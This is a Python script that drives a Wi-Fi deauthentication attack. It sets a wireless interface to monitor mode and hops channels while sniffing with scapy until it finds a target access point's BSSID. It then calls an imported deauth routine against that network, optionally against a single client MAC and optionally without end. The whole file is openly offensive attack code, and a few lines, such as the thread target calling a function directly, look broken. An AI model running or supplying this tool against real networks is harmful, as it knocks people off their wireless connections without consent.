from attacks import deauth
from callbacks import get_hostnames, networks
from config import interface, get_deauth_args, get_interfaces
from threading import Thread
from scapy import *
from scapy.all import *

if __name__ == '__main__':
    arguments = get_deauth_args()
    if arguments.interface:
        my_interface = interface(arguments.interface)
    else:
        my_interface = interface(get_interfaces[1])
    my_interface.set_monitor_mode()

    # Find channel the mac address is listening on
    channel_changer = Thread(target=my_interface.change_channel())
    channel_changer.daemon = True
    channel_changer.start()
    # start sniffing
    while(arguments.bssid not in networks):
        sniff(prn=get_hostnames, iface=my_interface.name, count = 50)
    my_interface.kill_changer()
    channel_changer.join()
    channel_for_deauth = networks[networks['BSSID']==arguments.bssid]['Channel']
    my_interface.change_channel(channel_for_deauth)
    if arguments.destination_mac:
        if arguments.forever:
            deauth(my_interface.name, 
                    arguments.bssid, 
                    arguments.destination_mac, 
                    forever=True)
        else:
            deauth(my_interface.name, 
                    arguments.bssid, 
                    arguments.destination_mac)
    else:
        if arguments.forever:
            deauth(my_interface.name, 
                    arguments.bssid, 
                    forever=True)
        else:
            deauth(my_interface.name, 
                    arguments.bssid)
        